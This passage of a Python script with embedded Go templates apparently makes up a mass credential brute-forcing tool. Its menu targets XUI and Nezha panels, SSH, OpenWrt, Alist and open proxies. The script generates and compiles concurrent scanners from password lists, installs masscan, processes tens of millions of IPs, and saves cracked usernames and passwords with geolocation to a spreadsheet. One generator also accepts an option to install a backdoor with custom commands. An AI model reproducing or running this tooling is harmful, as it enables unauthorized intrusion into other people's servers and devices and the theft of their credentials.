        if resp != nil { resp.Body.Close() }
        return false, err 
    }
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil { return false, fmt.Errorf("无法读取响应") }
	proxyIP := string(body)
	if strings.Contains(proxyIP, "当前 IP：") {
		parts := strings.Split(proxyIP, "：")
		if len(parts) > 1 {
			ipParts := strings.Split(parts[1], " ")
			proxyIP = ipParts[0]
		}
	}
	proxyIP = strings.TrimSpace(proxyIP)

	if realIP == "UNKNOWN" || proxyIP == "" { return false, fmt.Errorf("无法获取IP验证") }
	if proxyIP == realIP { return false, fmt.Errorf("透明代理") }
	return true, nil
}

func main() {
	if len(os.Args) < 3 {
		fmt.Println("Usage: ./program <inputFile> <outputFile>")
		os.Exit(1)
	}
	inputFile, outputFile := os.Args[1], os.Args[2]
	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
	go func() {
		<-sigChan
		fmt.Println("\\nGracefully shutting down...")
		os.Exit(0)
	}()
    go memoryMonitor()
	var err error
	realIP, err = getPublicIP(testURL)
	if err != nil {
		realIP = "UNKNOWN"
	}
	proxies, err := os.Open(inputFile)
	if err != nil {
		fmt.Printf("无法打开代理文件: %v\\n", err)
		return
	}
	defer proxies.Close()
	
	totalLines, _ := countLines(inputFile)
	go func() {
		ticker := time.NewTicker(500 * time.Millisecond)
		defer ticker.Stop()
		for {
			current := atomic.LoadInt64(&completedCount)
			if totalLines > 0 {
				percentage := float64(current) / float64(totalLines) * 100
				bar := strings.Repeat("=", int(percentage/2)) + strings.Repeat("-", 50-int(percentage/2))
				fmt.Fprintf(os.Stdout, "\\r[%s] %.2f%% (%d/%d) ", bar, percentage, current, totalLines)
			}
			if current >= int64(totalLines) {
				fmt.Fprintf(os.Stdout, "\\n")
				return
			}
			<-ticker.C
		}
	}()

	outFile, err := os.OpenFile(outputFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		fmt.Printf("无法创建输出文件: %v\\n", err)
		return
	}
	defer outFile.Close()
	tasks := make(chan string, {semaphore_size})
	var wg sync.WaitGroup
	for i := 0; i < {semaphore_size}; i++ {
		wg.Add(1)
		go worker(tasks, outFile, &wg)
	}
	scanner := bufio.NewScanner(proxies)
	for scanner.Scan() {
        for atomic.LoadInt32(&isMemoryThrottled) == 1 { time.Sleep(250 * time.Millisecond) }
		proxyAddr := strings.TrimSpace(scanner.Text())
		if proxyAddr != "" { tasks <- proxyAddr }
	}
	close(tasks)
	wg.Wait()
}
'''
# =========================== ALIST_GO_TEMPLATE (Alist面板) ===========================
ALIST_GO_TEMPLATE = '''package main

import (
	"bufio"
	"context"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"net/http"
	"os"
	"os/signal"
	"runtime"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"
)

var completedCount int64
var isMemoryThrottled int32

func countLines(filePath string) (int, error) {
	file, err := os.Open(filePath)
	if err != nil { return 0, err }
	defer file.Close()
	scanner := bufio.NewScanner(file)
	count := 0
	for scanner.Scan() { count++ }
	return count, scanner.Err()
}

func memoryMonitor() {
	var baselineMem uint64
	var m runtime.MemStats
	time.Sleep(2 * time.Second)
	runtime.ReadMemStats(&m)
	baselineMem = m.Sys
	highWatermark := baselineMem + 200*1024*1024
	lowWatermark := baselineMem + 100*1024*1024
	ticker := time.NewTicker(2 * time.Second)
	defer ticker.Stop()
	for range ticker.C {
		runtime.ReadMemStats(&m)
		if m.Sys >= highWatermark {
			atomic.StoreInt32(&isMemoryThrottled, 1)
		} else if m.Sys < lowWatermark {
			atomic.StoreInt32(&isMemoryThrottled, 0)
		}
	}
}

func createHttpClient() *http.Client {
	tr := &http.Transport{
		Proxy: http.ProxyFromEnvironment,
		DialContext: (&net.Dialer{
			Timeout:   2 * time.Second,
			KeepAlive: 0,
		}).DialContext,
		TLSClientConfig:       &tls.Config{InsecureSkipVerify: true},
		TLSHandshakeTimeout:   2 * time.Second,
		ResponseHeaderTimeout: 2 * time.Second,
		ExpectContinueTimeout: 1 * time.Second,
		ForceAttemptHTTP2:     false,
		DisableKeepAlives:     true,
	}
	return &http.Client{
		Transport: tr,
		Timeout:   3 * time.Second,
	}
}

func worker(tasks <-chan string, file *os.File, wg *sync.WaitGroup) {
	defer wg.Done()
	httpClient := createHttpClient()
	for ipPort := range tasks {
		processIP(ipPort, file, httpClient)
		atomic.AddInt64(&completedCount, 1)
	}
}

func processIP(ipPort string, file *os.File, httpClient *http.Client) {
	parts := strings.SplitN(ipPort, ":", 2)
	if len(parts) != 2 { return }
	ip, port := strings.TrimSpace(parts[0]), strings.TrimSpace(parts[1])

	for _, proto := range []string{"http", "https"} {
		base := fmt.Sprintf("%s://%s:%s", proto, ip, port)
		testURL := base + "/api/me"
		ctx, cancel := context.WithTimeout(context.Background(), 3*time.Second)
		req, err := http.NewRequestWithContext(ctx, "GET", testURL, nil)
		if err != nil {
			cancel()
			continue
		}
		req.Header.Set("User-Agent", "Mozilla/5.0")
		req.Header.Set("Connection", "close")
		resp, err := httpClient.Do(req)
		cancel()
		if err == nil && isValidResponse(resp) {
			file.WriteString(base + "\\n")
			return
		}
	}
}

func isValidResponse(resp *http.Response) bool {
	if resp == nil { return false }
	defer resp.Body.Close()
	body, err := io.ReadAll(io.LimitReader(resp.Body, 256*1024))
	if err != nil { return false }
	var data map[string]interface{}
	if err := json.Unmarshal(body, &data); err != nil { return false }
	if v, ok := data["code"]; ok {
		switch t := v.(type) {
		case float64:
			return int(t) == 200
		case string:
			return t == "200"
		}
	}
	return false
}

func main() {
	if len(os.Args) < 3 {
		fmt.Println("Usage: ./program <inputFile> <outputFile>")
		os.Exit(1)
	}
	inputFile, outputFile := os.Args[1], os.Args[2]
	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
	go func() {
		<-sigChan
		fmt.Println("\\nGracefully shutting down...")
		os.Exit(0)
	}()
    go memoryMonitor()
	batch, err := os.Open(inputFile)
	if err != nil {
		fmt.Printf("无法读取输入文件: %v\\n", err)
		return
	}
	defer batch.Close()

	totalLines, _ := countLines(inputFile)
	go func() {
		ticker := time.NewTicker(500 * time.Millisecond)
		defer ticker.Stop()
		for {
			current := atomic.LoadInt64(&completedCount)
			if totalLines > 0 {
				percentage := float64(current) / float64(totalLines) * 100
				bar := strings.Repeat("=", int(percentage/2)) + strings.Repeat("-", 50-int(percentage/2))
				fmt.Fprintf(os.Stdout, "\\r[%s] %.2f%% (%d/%d) ", bar, percentage, current, totalLines)
			}
			if current >= int64(totalLines) {
				fmt.Fprintf(os.Stdout, "\\n")
				return
			}
			<-ticker.C
		}
	}()

	outFile, err := os.OpenFile(outputFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		fmt.Println("无法打开输出文件:", err)
		return
	}
	defer outFile.Close()
	tasks := make(chan string, {semaphore_size})
	var wg sync.WaitGroup
	for i := 0; i < {semaphore_size}; i++ {
		wg.Add(1)
		go worker(tasks, outFile, &wg)
	}
	scanner := bufio.NewScanner(batch)
	for scanner.Scan() {
        for atomic.LoadInt32(&isMemoryThrottled) == 1 { time.Sleep(250 * time.Millisecond) }
		line := strings.TrimSpace(scanner.Text())
		if line != "" {
			fields := strings.Fields(line)
			if len(fields) > 0 {
				tasks <- fields[0]
			}
		}
	}
	close(tasks)
	wg.Wait()
}
'''

# =========================== ipcx.py 内容 (增加tqdm风格进度条) ===========================
IPCX_PY_CONTENT = r"""import requests
import time
import os
import re
import sys
from openpyxl import Workbook, load_workbook
from openpyxl.utils import get_column_letter

def extract_host_port(line):
    match = re.search(r'https?://([^/\s]+)', line)
    if match:
        return match.group(1)
    else:
        return line.strip()

def get_ip_info(ip_port, retries=3):
    if ':' in ip_port:
        ip, port = ip_port.split(':', 1)
    else:
        ip = ip_port.strip()
        port = ''
    url = f"http://ip-api.com/json/{ip}?fields=country,regionName,city,isp"
    for attempt in range(retries):
        try:
            response = requests.get(url, timeout=5)
            if response.status_code == 200:
                ip_info = response.json()
                country = ip_info.get('country', 'N/A')
                region = ip_info.get('regionName', 'N/A')
                city = ip_info.get('city', 'N/A')
                isp = ip_info.get('isp', 'N/A')
                return [f"{ip}:{port}" if port else ip, country, region, city, isp]
        except requests.exceptions.RequestException:
            if attempt < retries - 1:
                time.sleep(1)
            else:
                return [f"{ip}:{port}" if port else ip, 'N/A', 'N/A', 'N/A', 'N/A']
    return [f"{ip}:{port}" if port else ip, 'N/A', 'N/A', 'N/A', 'N/A']

def adjust_column_width(ws):
    for col in ws.columns:
        max_length = 0
        column = col[0].column
        column_letter = get_column_letter(column)
        for cell in col:
            try:
                if cell.value:
                    length = len(str(cell.value))
                    if length > max_length:
                        max_length = length
            except:
                pass
        adjusted_width = max_length + 2
        ws.column_dimensions[column_letter].width = adjusted_width

def extract_ip_port(url):
    match = re.search(r'(\w+://)?([^@/]+@)?([^:/]+:\d+)', url)
    if match:
        return match.group(3)
    
    # Fallback for simple ip:port
    match = re.search(r'([^:/]+:\d+)', url)
    if match:
        return match.group(1)

    return url.split()[0]


def print_progress_bar(iteration, total, start_time, prefix='', suffix='', length=50, fill='█'):
    elapsed_time = time.time() - start_time
    percent_str = "{0:.1f}".format(100 * (iteration / float(total)))
    filled_length = int(length * iteration // total)
    bar = fill * filled_length + '-' * (length - filled_length)

    if iteration > 0 and elapsed_time > 0:
        its_per_sec = iteration / elapsed_time
        remaining_time = (total - iteration) / its_per_sec
        eta_str = time.strftime('%M:%S', time.gmtime(remaining_time))
    else:
        its_per_sec = 0
        eta_str = "??:??"

    elapsed_str = time.strftime('%M:%S', time.gmtime(elapsed_time))
    
    progress_str = f'\r{prefix} |{bar}| {iteration}/{total} [{elapsed_str}<{eta_str}, {its_per_sec:.2f}it/s] {suffix}      '
    
    sys.stdout.write(progress_str)
    sys.stdout.flush()
    if iteration == total:
        sys.stdout.write('\n')

def process_ip_port_file(input_file, output_excel):
    with open(input_file, 'r', encoding='utf-8') as f:
        lines = [line.strip() for line in f if line.strip()]
    total_tasks = len(lines)
    start_time = time.time()

    headers = ['原始地址', 'IP/域名:端口', '用户名', '密码', '国家', '地区', '城市', 'ISP']

    if os.path.exists(output_excel):
        os.remove(output_excel)

    wb = Workbook()
    ws = wb.active
    ws.title = "IP信息"
    ws.append(headers)
    wb.save(output_excel)

    print_progress_bar(0, total_tasks, start_time, prefix='IP信息查询', suffix='开始...')
    for i, line in enumerate(lines):
        completed_tasks = i + 1
        
        addr = line
        user, passwd = '', ''
        
        # More robust parsing for proxy URLs
        try:
            parsed_url = re.match(r'(\w+)://(?:([^:]+):([^@]+)@)?(.+)', line)
            if parsed_url:
                user = parsed_url.group(2) or ''
                passwd = parsed_url.group(3) or ''
                addr = f"{parsed_url.group(1)}://{parsed_url.group(4)}"
        except (TypeError, AttributeError):
             # Fallback for simple ip:port user pass format
            parts = line.split()
            if len(parts) >= 3:
                addr, user, passwd = parts[0], parts[1], parts[2]
            else:
                addr = parts[0]
        
        ip_port = extract_ip_port(addr)
        ip_info = get_ip_info(ip_port)
        
        # If user/passwd were parsed from URL, use them
        row = [line, ip_port, user, passwd] + ip_info[1:]

        wb = load_workbook(output_excel)
        ws = wb.active
        ws.append(row)
        adjust_column_width(ws)
        wb.save(output_excel)

        print_progress_bar(completed_tasks, total_tasks, start_time, prefix='IP信息查询', suffix=f'{ip_port}')
        time.sleep(1.5)
    print("\nIP信息查询完成！")


if __name__ == "__main__":
    process_ip_port_file('xui.txt', 'xui.xlsx')
"""
# =========================== 主脚本优化部分 ===========================
# 定义Go可执行文件的绝对路径
GO_EXEC = "/usr/local/go/bin/go"

def input_with_default(prompt, default):
    user_input = input(f"{prompt}（默认 {default}）：").strip()
    return int(user_input) if user_input.isdigit() else default

def input_filename_with_default(prompt, default):
    user_input = input(f"{prompt}（默认 {default}）：").strip()
    return user_input if user_input else default

def escape_go_string(s: str) -> str:
    return s.replace("\\", "\\\\").replace('"', '\\"')

def generate_xui_go(semaphore_size, usernames, passwords, **kwargs):
    user_list = "[]string{" + ", ".join([f'"{escape_go_string(u)}"' for u in usernames]) + "}"
    pass_list = "[]string{" + ", ".join([f'"{escape_go_string(p)}"' for p in passwords]) + "}"
    code = XUI_GO_TEMPLATE_1.replace("{semaphore_size}", str(semaphore_size)) \
                            .replace("{user_list}", user_list) \
                            .replace("{pass_list}", pass_list)
    with open('xui.go', 'w', encoding='utf-8') as f:
        f.write(code)

def generate_xui_go_template2(semaphore_size, usernames, passwords, **kwargs):
    user_list = "[]string{" + ", ".join([f'"{escape_go_string(u)}"' for u in usernames]) + "}"
    pass_list = "[]string{" + ", ".join([f'"{escape_go_string(p)}"' for p in passwords]) + "}"
    code = XUI_GO_TEMPLATE_2.replace("{semaphore_size}", str(semaphore_size)) \
                            .replace("{user_list}", user_list) \
                            .replace("{pass_list}", pass_list)
    with open('xui.go', 'w', encoding='utf-8') as f:
        f.write(code)

def to_go_bool(val: bool) -> str:
    return "true" if val else "false"

def to_go_string_array_one_line(lines: list) -> str:
    if not lines:
        return "[]string{}"
    return "[]string{" + ", ".join([f'"{escape_go_string(line)}"' for line in lines]) + "}"


def generate_xui_go_template6(semaphore_size, usernames, passwords, install_backdoor, custom_cmds, **kwargs):
    user_list = "[]string{" + ", ".join([f'"{escape_go_string(u)}"' for u in usernames]) + "}"
    pass_list = "[]string{" + ", ".join([f'"{escape_go_string(p)}"' for p in passwords]) + "}"
    backdoor_flag = to_go_bool(install_backdoor)
    cmd_array = to_go_string_array_one_line(custom_cmds)
    code = XUI_GO_TEMPLATE_6.replace("{semaphore_size}", str(semaphore_size)) \
                            .replace("{user_list}", user_list) \
                            .replace("{pass_list}", pass_list) \
                            .replace("{enable_backdoor}", backdoor_flag) \
                            .replace("{custom_backdoor_cmds}", cmd_array)
    with open('xui.go', 'w', encoding='utf-8') as f:
        f.write(code)

def generate_xui_go_template7(semaphore_size, usernames, passwords, **kwargs):
    user_list = "[]string{" + ", ".join([f'"{escape_go_string(u)}"' for u in usernames]) + "}"
    pass_list = "[]string{" + ", ".join([f'"{escape_go_string(p)}"' for p in passwords]) + "}"
    code = XUI_GO_TEMPLATE_7.replace("{semaphore_size}", str(semaphore_size)) \
                            .replace("{user_list}", user_list) \
                            .replace("{pass_list}", pass_list)
    with open('xui.go', 'w', encoding='utf-8') as f:
        f.write(code)

def generate_xui_go_template8(semaphore_size, usernames, passwords, **kwargs):
    user_list = "[]string{" + ", ".join([f'"{escape_go_string(u)}"' for u in usernames]) + "}"
    pass_list = "[]string{" + ", ".join([f'"{escape_go_string(p)}"' for p in passwords]) + "}"
    code = XUI_GO_TEMPLATE_8.replace("{semaphore_size}", str(semaphore_size)) \
                            .replace("{user_list}", user_list) \
                            .replace("{pass_list}", pass_list)
    with open('xui.go', 'w', encoding='utf-8') as f:
        f.write(code)

def generate_proxy_go(semaphore_size, auth_mode, proxy_type, timeout, usernames, passwords, credentials, **kwargs):
    user_list = to_go_string_array_one_line(usernames)
    pass_list = to_go_string_array_one_line(passwords)
    creds_list = to_go_string_array_one_line(credentials)

    code = PROXY_GO_TEMPLATE.replace("{semaphore_size}", str(semaphore_size)) \
                            .replace("{auth_mode}", str(auth_mode)) \
                            .replace("{proxy_type}", proxy_type) \
                            .replace("{timeout}", str(timeout)) \
                            .replace("{user_list}", user_list) \
                            .replace("{pass_list}", pass_list) \
                            .replace("{creds_list}", creds_list)
    with open('xui.go', 'w', encoding='utf-8') as f:
        f.write(code)

def generate_alist_go(semaphore_size, **kwargs):
    code = ALIST_GO_TEMPLATE.replace("{semaphore_size}", str(semaphore_size))
    with open('xui.go', 'w', encoding='utf-8') as f:
        f.write(code)

def generate_ipcx_py():
    with open('ipcx.py', 'w', encoding='utf-8') as f:
        f.write(IPCX_PY_CONTENT)

def split_file(input_file, lines_per_file):
    """
    **MEMORY-EFFICIENT FILE SPLITTING**
    This function reads the input file line by line (streaming) instead of
    loading the whole file into memory. This allows it to handle files of
    any size (like 40 million IPs) with minimal memory usage.
    """
    print(f"--- 正在以流式模式分割大文件 '{input_file}'... (这可能需要一些时间) ---")
    try:
        with open(input_file, 'r', encoding='utf-8', errors='ignore') as f_in:
            part_num = 1
            f_out = None
            for i, line in enumerate(f_in):
                if i % lines_per_file == 0:
                    if f_out:
                        f_out.close()
                    part_filename = os.path.join(TEMP_PART_DIR, f"part_{part_num}.txt")
                    f_out = open(part_filename, 'w', encoding='utf-8')
                    part_num += 1
                f_out.write(line)
            if f_out:
                f_out.close()
        print("--- 文件分割完成 ---")
    except Exception as e:
        print(f"❌ 文件分割时发生错误: {e}")
        sys.exit(1)


def compile_go_program():
    executable_name = "xui_executable"
    if sys.platform == "win32":
        executable_name += ".exe"

    print("--- 正在编译Go程序... ---")
    
    go_env = os.environ.copy()
    if 'HOME' not in go_env:
        go_env['HOME'] = '/tmp'
    if 'GOCACHE' not in go_env:
        go_env['GOCACHE'] = '/tmp/.cache/go-build'

    try:
        process = subprocess.Popen(
            [GO_EXEC, 'build', '-o', executable_name, 'xui.go'],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            env=go_env
        )
        stdout, stderr = process.communicate()
        stdout = stdout.decode('utf-8', errors='ignore')
        stderr = stderr.decode('utf-8', errors='ignore')

        if process.returncode != 0:
            raise subprocess.CalledProcessError(process.returncode, [GO_EXEC, 'build', '-o', executable_name, 'xui.go'], stdout, stderr)
        
        if stderr:
            print("--- Go编译器警告 ---")
            print(stderr)
        print(f"--- Go程序编译成功: {executable_name} ---")
        return executable_name
    except subprocess.CalledProcessError as e:
        print("--- Go 程序编译失败 ---")
        print(f"返回码: {e.returncode}")
        print("--- 标准输出 ---")
        print(e.stdout)
        print("--- 错误输出 ---")
        print(e.stderr)
        print("--------------------------")
        print("编译失败，请检查Go环境和代码。")
        sys.exit(1)

def adjust_oom_score():
    if sys.platform != "linux":
        return
    
    try:
        pid = os.getpid()
        oom_score_adj_path = f"/proc/{pid}/oom_score_adj"
        if os.path.exists(oom_score_adj_path):
            with open(oom_score_adj_path, "w") as f:
                f.write("-500")
            print("✅ 成功调整OOM Score，降低被系统杀死的概率。")
    except PermissionError:
        print("⚠️  调整OOM Score失败：权限不足。建议使用root用户运行以获得最佳稳定性。")
    except Exception as e:
        print(f"⚠️  调整OOM Score时发生未知错误: {e}")

def check_and_manage_swap():
    if sys.platform != "linux":
        return

    try:
        swap_info = psutil.swap_memory()
        if swap_info.total > 0:
            print(f"✅ 检测到已存在的Swap空间，大小: {swap_info.total / 1024 / 1024:.2f} MiB。")
            return

        print("⚠️  警告：未检测到活动的Swap交换空间。在高负载下，这会极大地增加进程被系统杀死的风险。")
        choice = input("❓ 是否要创建一个2GB的临时Swap文件来提高稳定性？(y/N): ").strip().lower()
        
        if choice == 'y':
            swap_file = "/tmp/autoswap.img"
            print(f"--- 正在创建2GB Swap文件: {swap_file} (可能需要一些时间)... ---")
            
            if shutil.which("fallocate"):
                subprocess.run(["fallocate", "-l", "2G", swap_file], check=True)
            else:
                subprocess.run(["dd", "if=/dev/zero", f"of={swap_file}", "bs=1M", "count=2048"], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            subprocess.run(["chmod", "600", swap_file], check=True)
            subprocess.run(["mkswap", swap_file], check=True)
            subprocess.run(["swapon", swap_file], check=True)
            
            atexit.register(cleanup_swap, swap_file)
            
            print(f"✅ 成功创建并启用了2GB Swap文件: {swap_file}")
            print("   该文件将在脚本退出时自动被禁用和删除。")

    except Exception as e:
        print(f"❌ Swap文件管理失败: {e}")
        print("   请检查权限或手动创建Swap。脚本将继续运行，但稳定性可能受影响。")

def cleanup_swap(swap_file):
    print(f"\n--- 正在禁用和清理临时Swap文件: {swap_file} ---")
    try:
        subprocess.run(["swapoff", swap_file], check=False)
        os.remove(swap_file)
        print("✅ 临时Swap文件已成功清理。")
    except Exception as e:
        print(f"⚠️ 清理Swap文件失败: {e}")

def run_xui_for_parts(sleep_seconds, executable_name, total_ips, semaphore_size):
    part_files = sorted([f for f in os.listdir(TEMP_PART_DIR) if f.startswith('part_') and f.endswith('.txt')])
    total_parts = len(part_files)
    
    total_memory = psutil.virtual_memory().total
    mem_limit = int(total_memory * 0.70 / 1024 / 1024)
    print(f"检测到总内存: {total_memory / 1024 / 1024:.2f} MiB。将设置Go内存限制为: {mem_limit}MiB (总内存的70%)")
    
    run_env = os.environ.copy()
    run_env["GOMEMLIMIT"] = f"{mem_limit}MiB"
    run_env["GOGC"] = "50"
    print("--- 已设置Go垃圾回收器(GC)更积极地运行以控制内存。 ---")

    for idx, part in enumerate(part_files, 1):
        print(f"\n--- [开始处理 Part {idx}/{total_parts}] ---")
        while True:
            mem_info = psutil.virtual_memory()
            available_percent = mem_info.available / mem_info.total * 100
            if available_percent < 15:
                print(f"\n⚠️ 系统可用内存低于15% (当前: {available_percent:.2f}%)，暂停60秒以待系统恢复...")
                time.sleep(60)
            else:
                break
        
        part_path = os.path.join(TEMP_PART_DIR, part)
        
        try:
            if sys.platform != "win32":
                os.chmod(executable_name, 0o755)
            
            output_file = os.path.join(TEMP_XUI_DIR, f'xui{idx}.txt')
            cmd = ['./' + executable_name, part_path, output_file]

            process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                env=run_env
            )
            
            for line in iter(lambda: process.stdout.readline(), b''):
                line_str = line.decode('utf-8', errors='ignore')
                sys.stdout.write(line_str)
                sys.stdout.flush()

            process.wait()
            if process.returncode != 0:
                 raise subprocess.CalledProcessError(process.returncode, cmd)

        except subprocess.CalledProcessError as e:
            print(f"\n--- 程序执行失败: {part} ---")
            print(f"返回码: {e.returncode}")
            sys.exit(1)
        
        print(f"--- [Part {idx}/{total_parts} 处理完成] ---")
        time.sleep(sleep_seconds)

def merge_xui_files():
    merged_file = 'xui.txt' 
    if os.path.exists(merged_file):
        os.remove(merged_file)

    with open(merged_file, 'w', encoding='utf-8') as outfile:
        for f in sorted(os.listdir(TEMP_XUI_DIR)):
            if f.startswith("xui") and f.endswith(".txt"):
                with open(os.path.join(TEMP_XUI_DIR, f), 'r', encoding='utf-8') as infile:
                    shutil.copyfileobj(infile, outfile)

def merge_result_files(prefix: str, output_name: str, target_dir: str):
    output_path = output_name 
    if os.path.exists(output_path):
        os.remove(output_path)
    
    files_to_merge = [os.path.join(target_dir, name) for name in sorted(os.listdir(target_dir)) if name.startswith(prefix) and name.endswith(".txt")]
    if not files_to_merge:
        return

    with open(output_path, "w", encoding="utf-8") as out:
        for f_path in files_to_merge:
            with open(f_path, "r", encoding="utf-8") as f:
                shutil.copyfileobj(f, out)


def run_ipcx():
    if os.path.exists('xui.txt') and os.path.getsize('xui.txt') > 0:
        subprocess.run([sys.executable, 'ipcx.py'])

def clean_temp_files():
    shutil.rmtree(TEMP_PART_DIR, ignore_errors=True)
    shutil.rmtree(TEMP_XUI_DIR, ignore_errors=True)
    shutil.rmtree(TEMP_HMSUCCESS_DIR, ignore_errors=True)
    shutil.rmtree(TEMP_HMFAIL_DIR, ignore_errors=True)

    for f in ['xui.go', 'ipcx.py', 'go.mod', 'go.sum', 'xui_executable', 'xui_executable.exe']: 
        if os.path.exists(f):
            try:
                os.remove(f)
            except OSError:
                pass

def choose_template_mode():
    print("请选择爆破模式：")
    print("1. XUI面板")
    print("2. 哪吒面板")
    print("3. SSH")
    print("4. Sub Store")
    print("5. OpenWrt/iStoreOS")
    print("--- 代理模式 ---")
    print("6. SOCKS5 代理")
    print("7. HTTP 代理")
    print("8. HTTPS 代理")
    print("--- 其他面板 ---")
    print("9. Alist 面板")
    while True:
        choice = input("输入 1-9 之间的数字（默认1）：").strip()
        if choice in ("", "1"): return 1
        elif choice == "2": return 2
        elif choice == "3": return 6
        elif choice == "4": return 7
        elif choice == "5": return 8
        elif choice == "6": return 9   # SOCKS5
        elif choice == "7": return 10  # HTTP
        elif choice == "8": return 11  # HTTPS
        elif choice == "9": return 12  # Alist
        else:
            print("输入无效，请重新输入。")

def check_environment(template_mode):
    import platform
    import re
    
    def run_cmd(cmd, check=True, quiet=False, extra_env=None):
        env = os.environ.copy()
        if extra_env:
            env.update(extra_env)
        
        stdout = subprocess.DEVNULL if quiet else None
        stderr = subprocess.DEVNULL if quiet else None
        try:
            subprocess.run(cmd, check=check, stdout=stdout, stderr=stderr, env=env)
        except subprocess.CalledProcessError as e:
            if check: raise e
        except FileNotFoundError:
            print(f"❌ 命令未找到: {cmd[0]}。请确保该命令在您的系统PATH中。")
            raise

    def is_in_china():
        print("\n    - 正在通过 ping google.com 检测网络环境...")
        try:
            # 使用 ping 来检测是否在中国。如果失败，则认为是在中国。
            result = subprocess.run(
                ["ping", "-c", "1", "-W", "2", "google.com"],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                check=False 
            )
            if result.returncode == 0:
                print("    - ✅ Ping 成功，判断为海外服务器。")
                return False
            else:
                print("    - ⚠️ Ping 超时或失败，判断为国内服务器，将自动使用镜像。")
                return True
        except FileNotFoundError:
            print("    - ⚠️ 未找到 ping 命令，无法检测网络。将使用默认源。")
            return False
        except Exception:
            print("    - ⚠️ Ping 检测时发生未知错误，将使用默认源。")
            return False

    if platform.system().lower() == "windows":
        print(">>> 检测到 Windows 系统，跳过环境检测和依赖安装...\\n")
        try:
            import psutil, requests, openpyxl, yaml
        except ImportError:
            print("⚠️ 检测到模块缺失，请在Windows上手动安装: pip install psutil requests openpyxl pyyaml")
        return

    print(">>> 正在检查并安装依赖环境...")
    
    pkg_manager = ""
    if shutil.which("apt-get"):
        pkg_manager = "apt-get"
    elif shutil.which("yum"):
        pkg_manager = "yum"
    else:
        print("❌ 无法检测到 apt-get 或 yum。此脚本仅支持 Debian/Ubuntu 和 CentOS/RHEL 系列系统。")
        sys.exit(1)

    print(f"    - 检测到包管理器: {pkg_manager}")
    
    UPDATED = False
    def ensure_packages(pm, packages):
        nonlocal UPDATED
        sys.stdout.write(f"    - 正在使用 {pm} 检查系统包...")
        sys.stdout.flush()
        try:
            if not UPDATED and pm == "apt-get":
                run_cmd([pm, "update", "-y"], quiet=True)
                UPDATED = True
            
            install_cmd = [pm, "install", "-y"] + packages
            run_cmd(install_cmd, quiet=True)
            print(" 完成")
        except Exception as e:
            print(f" 失败: {e}")
            sys.exit(1)

    # 为 ping 命令安装对应的包
    ping_package = "iputils" if pkg_manager == "yum" else "iputils-ping"
    ensure_packages(pkg_manager, ["curl", ping_package])
    
    in_china = is_in_china()
    
    if pkg_manager == "apt-get":
        ensure_packages("apt-get", ["python3-pip"])
    else: # yum
        run_cmd(["yum", "install", "-y", "epel-release"], quiet=True, check=False)
        ensure_packages("yum", ["python3-pip"])
        # This command can fail safely if alternatives is not set up
        run_cmd(["alternatives", "--set", "python", "/usr/bin/python3"], check=False, quiet=True)

    sys.stdout.write("    - 正在使用 pip 安装 Python 模块...")
    sys.stdout.flush()
    try:
        pip_cmd = [sys.executable, "-m", "pip", "install"]
        if in_china:
            pip_cmd.extend(["-i", "https://pypi.tuna.tsinghua.edu.cn/simple"])
        pip_cmd.extend(["requests", "psutil", "openpyxl", "pyyaml"])
        run_cmd(pip_cmd, quiet=True)
        print(" 完成")
    except Exception as e:
        print(f" 失败: {e}")
        sys.exit(1)

    ensure_packages(pkg_manager, ["ca-certificates", "tar", "masscan"])

    if pkg_manager == "apt-get":
        sys.stdout.write("    - 正在更新CA证书...")
        sys.stdout.flush()
        run_cmd(["update-ca-certificates"], quiet=True)
        print(" 完成")

    def get_go_version():
        if not os.path.exists(GO_EXEC): return None
        try:
            out = subprocess.check_output([GO_EXEC, "version"], stderr=subprocess.DEVNULL).decode()
            m = re.search(r"go(\d+)\.(\d+)", out)
            return (int(m.group(1)), int(m.group(2))) if m else None
        except:
            return None

    if not (get_go_version() and get_go_version() >= (1, 20)):
        print("--- Go环境不满足，正在自动安装... ---")
        if pkg_manager == "apt-get":
            run_cmd(["apt-get", "remove", "-y", "golang-go"], check=False, quiet=True) 
            run_cmd(["apt-get", "autoremove", "-y"], check=False, quiet=True)
        else: # yum
             run_cmd(["yum", "remove", "-y", "golang"], check=False, quiet=True)

        urls = ["https://studygolang.com/dl/golang/go1.22.1.linux-amd64.tar.gz", "https://go.dev/dl/go1.22.1.linux-amd64.tar.gz"]
        if not in_china:
            urls.reverse() # Prioritize go.dev if not in China

        GO_TAR_PATH = "/tmp/go.tar.gz"
        download_success = False
        for url in urls:
            print(f"    - 正在从 {url.split('/')[2]} 下载Go...")
            try:
                subprocess.run(["curl", "-#", "-Lo", GO_TAR_PATH, url], check=True)
                download_success = True
                break
            except Exception:
                print(f"      下载失败，尝试下一个源...")
        
        if not download_success:
            print("❌ Go安装包下载失败，请检查网络。")
            sys.exit(1)

        sys.stdout.write("    - 正在解压Go安装包...")
        sys.stdout.flush()
        try:
            run_cmd(["rm", "-rf", "/usr/local/go"], quiet=True)
            run_cmd(["tar", "-C", "/usr/local", "-xzf", GO_TAR_PATH], quiet=True)
            print(" 完成")
        except Exception as e:
            print(f" 失败: {e}")
            sys.exit(1)

        os.environ["PATH"] = "/usr/local/go/bin:" + os.environ["PATH"]
    
    go_env = os.environ.copy()
    if 'HOME' not in go_env: go_env['HOME'] = '/tmp'
    if 'GOCACHE' not in go_env: go_env['GOCACHE'] = '/tmp/.cache/go-build'
    if in_china:
        go_env['GOPROXY'] = 'https://goproxy.cn,direct'

    if not os.path.exists("go.mod"):
        run_cmd([GO_EXEC, "mod", "init", "xui"], quiet=True, extra_env=go_env)

    required_pkgs = []
    if template_mode == 6: # SSH
        required_pkgs.append("golang.org/x/crypto/ssh")
    if template_mode in [9, 10, 11]: # Proxy modes
